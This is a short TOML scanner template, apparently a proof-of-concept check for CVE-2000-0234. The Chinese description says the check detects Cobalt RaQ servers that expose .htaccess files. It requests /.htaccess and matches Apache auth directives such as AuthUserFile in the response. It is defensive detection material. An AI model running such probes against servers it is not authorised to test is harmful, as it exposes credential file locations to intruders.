[info]
author = "AVE"
description = "检测 Cobalt RaQ 2.0/3.0 默认 Apache 配置是否允许远程直接访问 .htaccess 文件导致敏感信息泄露"
id = "POC-AVE-2000-0212"
name = "CVE-2000-0234 PoC"
severity = "medium"
tags = ["cve-2000-0234"]
vuln_id = [
    "CVE-2000-0234",
    "AVE-2000-0212",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.htaccess"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "AuthType",
    "AuthUserFile",
    "Require",
    "Deny from",
    "Allow from",
]
